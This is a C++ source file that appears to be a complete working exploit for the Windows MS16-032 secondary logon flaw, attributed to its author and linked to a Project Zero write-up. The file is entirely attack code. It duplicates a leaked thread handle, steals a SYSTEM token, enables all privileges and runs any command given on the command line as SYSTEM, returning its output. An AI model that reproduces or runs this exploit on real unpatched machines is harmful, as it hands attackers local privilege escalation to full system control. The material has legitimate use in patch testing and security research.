// ms16-032.cpp : 定义控制台应用程序的入口点。
//
//https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html

#include <stdio.h>
#include <Windows.h>
DWORD WINAPI ThreadProc(LPVOID lpParam){
	BYTE b[1030];
	DWORD d = 0;
	while (ReadFile((HANDLE)lpParam, b, 1024, &d, 0))
	{
		b[d] = '\0';
		printf("%s", b);
		fflush(stdout);
	}
	return 0;
}
void die(char* c)
{
	printf("%s: %d\n", c, GetLastError());
	exit(-1);
}
typedef NTSTATUS __stdcall _NtImpersonateThread(HANDLE,HANDLE,PSECURITY_QUALITY_OF_SERVICE);
int wmain(int argc, WCHAR* argv[])
{
	printf("[#] ms16-032 for service by zcgonvh\n");
	if (argc != 2)
	{
		printf("[#] usage: ms16-032 command \n");
		printf("[#] eg: ms16-032 \"whoami /all\" \n");
		return -1;
	}
	BOOL b = false;
	IsWow64Process(GetCurrentProcess(), &b);
	if (b) {
		printf("[x] please re-compiler this program via x64 platform\n");
		return 0;
	}
	WCHAR* wsSelf = (PWCHAR)malloc(65536*2);
	PROCESS_INFORMATION pi = {};
	STARTUPINFO si = {};
	si.cb = sizeof(si);
	si.hStdInput = GetCurrentThread();
	si.hStdOutput = GetCurrentThread();
	si.hStdError = GetCurrentThread();
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	GetModuleFileName(0, wsSelf, MAX_PATH);
	if (!CreateProcessWithLogonW(L"a", L"a", L"a", LOGON_NETCREDENTIALS_ONLY, 0, wsSelf, CREATE_SUSPENDED, 0, 0, &si, &pi))
	{
		die("[x] may be patched");
	}
	if (!pi.hProcess)
	{
		die("[x] may be patched");
	}
	HANDLE hThread;
	if (!DuplicateHandle(pi.hProcess, (HANDLE)4, GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS))
	{
		TerminateProcess(pi.hProcess, 1);
		die("[x] can not duplicate thread handle");
	}
	TerminateProcess(pi.hProcess, 1);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	HANDLE hCurrentToken, hToken;
	DWORD d=0;
	PTOKEN_PRIVILEGES tp = (PTOKEN_PRIVILEGES)malloc(2048);
	_NtImpersonateThread* NtImpersonateThread=(_NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"),"NtImpersonateThread");
	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	SetThreadToken(&hThread, 0);
	NTSTATUS status = NtImpersonateThread(hThread, hThread, &sqos);
	if (status)
	{
		printf("[x] can not do self-impersonate : %x\n", status);
		return -1;
	}
	if (!OpenThreadToken(hThread, TOKEN_ALL_ACCESS, 0, &hToken))
	{
		die("[x] can not open token from SYSTEM thread");
	}
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurrentToken))
	{
		die("[x] can not open current process token");
	}
	if(!GetTokenInformation(hCurrentToken, TokenPrivileges, tp, 2048, &d))
	{
		die("[x] can not get current privileges");
	}
	for (int i = 0; i < tp->PrivilegeCount; i++)
	{
		tp->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
	}
	if (!AdjustTokenPrivileges(hCurrentToken, false, tp, d, NULL,NULL))
	{
		die("[x] adjust all privileges fail");
	}
	b = false;
	DWORD data[] = { 2, 1, 0, 0, 0 , 0, 0, 0 };
	PPRIVILEGE_SET pset = (PPRIVILEGE_SET)data;
	pset->Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	LookupPrivilegeValue(0, SE_ASSIGNPRIMARYTOKEN_NAME, &pset->Privilege[0].Luid);
	pset->Privilege[1].Attributes = SE_PRIVILEGE_ENABLED;
	LookupPrivilegeValue(0, SE_INCREASE_QUOTA_NAME, &pset->Privilege[1].Luid);

	SECURITY_ATTRIBUTES sa = { 0 };
	HANDLE hRead, hWrite;
	ZeroMemory(&si,sizeof(si));
	ZeroMemory(&pi,sizeof(pi));
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = true;
	CreatePipe(&hRead, &hWrite, &sa, 1024);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.lpDesktop = L"WinSta0\\Default";
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	HANDLE hReadThread = CreateThread(NULL, 0, ThreadProc, hRead, 0, NULL);
	HANDLE hPrimary;
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, 0, SecurityImpersonation, TokenPrimary, &hPrimary))
	{
		die("[x] can not duplicate token to primary");
	}
	if (PrivilegeCheck(hCurrentToken, pset, &b) && b)
	{
		printf("[+] %ws was assigned\n",SE_ASSIGNPRIMARYTOKEN_NAME);
		CreateProcessAsUser(hPrimary, 0, argv[1], 0, 0, true, 0, 0, 0, &si, &pi);
	}
	else
	{
		pset->PrivilegeCount = 1;
		LookupPrivilegeValue(0, SE_IMPERSONATE_NAME, &pset->Privilege[0].Luid);
		if (PrivilegeCheck(hCurrentToken, pset, &b) && b)
		{
			printf("[+] %ws was assigned\n", SE_IMPERSONATE_NAME);
			CreateProcessWithTokenW(hPrimary, 0, 0, argv[1], 0, 0, 0, &si, &pi);
		}
		else
		{
			printf("[x] no privileges assigned! this program can only use on SERVICE.");
			return -1;
		}
	}
	if (pi.dwProcessId)
	{
		printf("[!] process with pid: %d created.\n==============================\n", pi.dwProcessId);
		fflush(stdout);
		WaitForSingleObject(pi.hProcess, -1);
		TerminateThread(hReadThread, 0);
		return -1;
	}
	else
	{
		die("[x] can not create process");
	}
	return 0;
}

